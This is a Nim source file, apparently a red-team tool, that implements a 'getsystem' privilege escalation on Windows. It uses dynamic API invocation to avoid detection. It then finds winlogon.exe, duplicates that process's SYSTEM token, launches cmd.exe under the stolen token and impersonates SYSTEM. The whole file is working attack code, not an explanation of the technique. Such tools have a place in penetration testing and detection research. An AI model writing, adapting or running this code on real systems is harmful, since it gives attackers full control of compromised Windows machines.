import winim
import ptr_math
import nimvoke/dinvoke
from strformat import `&`

dinvokeDefine(
    ConvertSidToStringSidW,
    "advapi32.dll",
    proc (sid: PSID, wstrSid: ptr LPWSTR): BOOL {.stdcall.}
)

dinvokeDefine(
    NtImpersonateThread,
    "ntdll.dll",
    proc (toAssignThreadHandle: HANDLE, toImpersonateThreadHandle: HANDLE, SecurityQualityOfService: PSECURITY_QUALITY_OF_SERVICE): NTSTATUS {.stdcall.}
)

proc enablePriv(priv:string): bool = 
    var
        hToken: HANDLE
        newtp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES()
        oldtp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES()
        luid: LUID = LUID()
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId())

    # Don't forget to close handles
    defer: CloseHandle(hProc)

    if hProc == cast[HANDLE](nil):
        when not defined release: echo "[x] Failed to open process handle"
        return false

    if 0 == OpenProcessToken(
        hProc,
        TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, # https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects
        addr hToken):
            when not defined release: echo "[x] Failed to open the process token of the parent process"
            return false
    
    defer: CloseHandle(hToken)
    if 0 == LookupPrivilegeValue(
        NULL,            # lookup privilege on local system
        L priv,   # privilege to lookup 
        addr luid):      # receives LUID of privilege
            when not defined release: echo "[x] LookupPrivilegeValue failed for " & priv
            return false


    newtp.PrivilegeCount = 1
    newtp.Privileges[0].Luid = luid
    newtp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED # enable the priv


    var sOldtp: DWORD = (DWORD)sizeof(TOKEN_PRIVILEGES)

    if 0 == AdjustTokenPrivileges(
        hToken,
        FALSE,
        addr newtp,
        (DWORD)sizeof(TOKEN_PRIVILEGES),
        addr oldtp,
        addr sOldtp):
            when not defined release: echo "[x] AdjustTokenPrivileges error: ", GetLastError()
            when not defined release: echo "[x] sOldtp = ", sOldtp
            return false

    var err = GetLastError()
    if ERROR_SUCCESS == err:
        when not defined release: echo "[*] Enabled " & priv
        return true
    elif ERROR_NOT_ALL_ASSIGNED == err:
        when not defined release: echo "[x] Failed to enable " & priv
        return false


func pCharToString*(pChar: PCHAR): string =
    ## return a nim string from a c string pointer
    result = ""
    var adr = pChar
    while not (adr[] == '\0' or adr[] == '`' or adr[] == '\176'):
        result = result & adr[].char
        adr = cast[PCHAR](cast[PVOID](adr) + sizeof(CHAR))
    return result


func pWCharToString*(pChar: PWCHAR): string =
    ## return a nim string from a wide c string pointer
    result = ""
    var adr = cast[PCHAR](pChar)
    while not (adr[] == '\0' or adr[] == '`' or adr[] == '\176'):
        result = result & adr[].char
        adr = cast[PCHAR](cast[PVOID](adr) + sizeof(WCHAR))
    return result

proc impersonateSystem():bool =
    ## classic getsystem
    var hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hProcessSnap ==  HANDLE(0):
        echo "[x] Failed to call CreateToolhelp32Snapshot"
        return false
    
    defer: hProcessSnap.CloseHandle()
    var pe32: PROCESSENTRY32 = PROCESSENTRY32()
    pe32.dwSize = sizeof(PROCESSENTRY32).int32

    if not Process32First(hProcessSnap, &pe32).bool:
        echo "[x] Failed to call Process32First"
        echo "GLE: ", GetLastError().toHex()
        return false
    
    var cont = true
    while cont:
        var
            peName = pWCharToString(cast[PWCHAR](pe32.szExeFile[0].addr))
            hProcess: HANDLE
            hToken: HANDLE
        
        
        # Open process
        hProcess = OpenProcess(PROCESS_ALL_ACCESS or PROCESS_QUERY_INFORMATION or PROCESS_DUP_HANDLE, FALSE, pe32.th32ProcessID)
       # echo peName
        if hProcess.bool and (peName == "winlogon.exe"):   
            echo peName
            defer: hProcess.CloseHandle()
            # Open token
            if OpenProcessToken(hProcess, MAXIMUM_ALLOWED or TOKEN_DUPLICATE or TOKEN_IMPERSONATE, &hToken).bool:
                if hToken != HANDLE(0):
                    defer: hToken.CloseHandle()
                    var sBuf: DWORD
                    GetTokenInformation(hToken, tokenUser, NULL, 0, &sBuf) # nil call to get the space required
                    var pTokenUser: ptr TOKEN_USER = cast[PTOKEN_USER](alloc0(sBuf))
                    if GetTokenInformation(hToken, tokenUser, pTokenUser, sBuf, &sBuf).bool:
                        var
                            bufUsername = alloc0(256*2)
                            lenUsername: DWORD = 256
                            bufDomain = alloc0(256*2)
                            lenDomain: DWORD = 256
                            sidNameUse: SID_NAME_USE
                        defer:
                            dealloc(bufUsername)
                            dealloc(bufDomain)

                        var pSidStr: ptr WCHAR
                        if ConvertSidToStringSidW(pTokenUser.User.Sid, &pSidStr).bool:
                            defer: LocalFree(cast[HLOCAL](pSidStr))
                            if LookupAccountSidW(NULL, pTokenUser.User.Sid, cast[LPWSTR](bufUsername), &lenUsername, cast[LPWSTR](bufDomain), &lenDomain, &sidNameUse).bool:
                                var username = pWCharToString(cast[PWCHAR](bufUsername))
                                echo &"{peName}\n\t\\----- {pWCharToString(pSidStr)}\n\t \\----- {username}"

                                var hDupToken: HANDLE
                                if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, securityImpersonation, tokenPrimary, &hDupToken):
                                    echo "[+] Token duplicated"
                                    var
                                        sui: STARTUPINFOW = STARTUPINFOW(
                                            cb: sizeof(STARTUPINFOW).int32,
                                            lpReserved: NULL,
                                            lpDesktop: r"winsta0\default", #  If the lpDesktop member is NULL, the new process inherits the desktop and window station of its parent process. If this member is an empty string, "", the new process connects to a window station using the rules described in `Process Connection to a Window Station`.
                                            lpTitle: &"{peName} ({username}) got pwn'd",
                                            dwX: 0,
                                            dwY: 0,
                                            dwXSize: 0,
                                            dwYSize: 0,
                                            dwXCountChars: 0,
                                            dwYCountChars: 0,
                                            dwFillAttribute: (FOREGROUND_RED or BACKGROUND_RED or BACKGROUND_GREEN or BACKGROUND_BLUE),
                                            dwFlags: STARTF_USEFILLATTRIBUTE or STARTF_USESHOWWINDOW,
                                            wShowWindow: SW_SHOWNA,
                                            cbReserved2: 0,
                                            lpReserved2: NULL,
                                            hStdInput: HANDLE(0),
                                            hStdOutput: HANDLE(0),
                                            hStdError: HANDLE(0),
                                        )
                                        pi = PROCESS_INFORMATION()
                                        
                                    if not CreateProcessWithTokenW(hDupToken, LOGON_NETCREDENTIALS_ONLY, "C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &sui, &pi):
                                        echo "[x] CreateProcessAsUser failed: ", GetLastError()
                                        

                                if ImpersonateLoggedOnUser(hDupToken):
                                    echo &"[+] Impersonated {peName} ({username})"
                                    return true
                                    
                    else: echo "[x] GetTokenInformation failed: ", GetLastError()
                    #[
                    
                    #return true
                    ]#
                else:
                    echo "[x] OpenProcessToken failed: ", GetLastError()
                    #return false
            else:
                echo "[x] OpenProcessToken failed: ", GetLastError()
                #return false

        # Next
        cont = Process32Next(hProcessSnap, &pe32)
        if not cont: echo "GLE: ", GetLastError()
    return false

when isMainModule:
    discard impersonateSystem()
